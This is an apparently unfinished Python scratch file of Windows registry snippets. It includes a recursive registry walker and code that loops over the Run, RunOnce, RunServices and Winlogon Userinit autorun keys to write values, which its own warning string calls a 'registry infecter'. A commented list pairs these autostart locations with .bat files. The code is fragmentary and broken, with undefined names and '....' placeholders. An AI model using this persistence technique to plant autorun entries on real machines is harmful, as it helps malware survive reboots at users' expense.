import winreg

node_to_reach = [
	r"Software\Microsoft\Windows\CurrentVersion\Run",
	r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
	r"Software\Microsoft\Windows\CurrentVersion\RunServices",
	r"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce",
	r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"	
]

registryHook = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
# then same for HKEY_CURRENT_USER
with registryHook:
	for aKey in node_to_reach:
		keyObj = winreg.OpenKey(registryHook, variable, 0, winreg.KEY_WRITE)
		try:
			winreg.SetValueEx(keyObj...)
		except EnvironmentError:
			continue
		except:	# Permission Error or OSError
			baseUtils.guiBox("registry infecter failed to modify registry . . .", "WARNING")
			break


<module great_example.py>
import os
import winreg

av = [_ for _ in dir(winreg) if _.startswith("HKEY_")
and not _[5] in "PD"]

HIVES = dict(zip(av, [eval("winreg.%s" % _) for _ in av]))

class RegKey:
	def __init__(self, name, key):
		self.name = name
		self.key = key
	def __str__(self):
		return self.name

def walk(top):
	if os.sep not in top:
		top = top + os.sep
	root, subkey = top.split(os.sep, 1)
	key = winreg.OpenKey(HIVES[root], subkey, 0, \
			winreg.KEY_READ|winreg.KEY_SET_VALUE)

	i, subkeys = 0, list()
	while True:
		try:
			subkeys.append(winreg.EnumKey(key, i))
			i+= 1
		except EnvironmentError:
			break

	i, values = 0, list()
	while True:
		try:
			values.append(winreg.EnumValue(key, i))
			i+= 1
		except EnvironmentError:
			break

	yield RegKey(top, key), subkeys, values
	for subkey in subkeys:
		for result in walk(top + os.sep + subkey):
			yield result




target = "HKEY_LOCAL_MACHINE\\Software\\Python"
for key, subkey_names, values in walk(target):
	print(key)
	for (name, data, tipe) in values:
		print(" ", name, "=>", data, "(", tipe, ")")
		# if tipe == winreg.REG_SZ and "TJG" in data:
		# 	winreg.SetValueEx(key.key, name, 0, tipe, data.replace("TJG", "XYZ"))

</module great_example.py>

<module ugly_examply.py>
def winAutoRun():
	from winreg import *
	aRegObj = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
	with aRegObj:
		keyObj = OpenKey(aRegObj, r"HARDWARE\DESCRIPTION\System\BIOS")
		with keyObj:
			for i in range(1024):	# QueryInfoKey(keyObj)
				try:
					n, v, t = EnumValue(keyObj, i)
					print(i, n, v, t)
				except EnvironmentError:
					print("You have %d entries in startup" % i)
					break
			keyObj = OpenKey(aRegObj, r"....", 0, KEY_WRITE)
			try:
				SetValueEx(keyObj, "MyNewKey", 0, REG_SZ, r"....")
			except EnvironmentError:
				baseUtils.guiBox("")
	return
</module ugly_examply.py>

# template = """
# time /t >> %s.txt
# echo "%s" >> %s.txt
# cls
# """

# places = [
# 	r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run",
# 	r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce",
# 	r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices",
# 	r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce",
# 	r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit",
# 	r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
# 	r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce",
# 	r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices",
# 	r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce",
# 	r"HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"
# ]

# names = ["one", "two", "three", "four", "five", "six", "seven", "eight", "nine", "ten"]

# for i in range(10):
# 	print("----\"C:\\Users\\z\\Desktop\\seqn\\", end="")
# 	print(names[i]+".bat\"")
# 	input(places[i])
# 	print("\n\n")
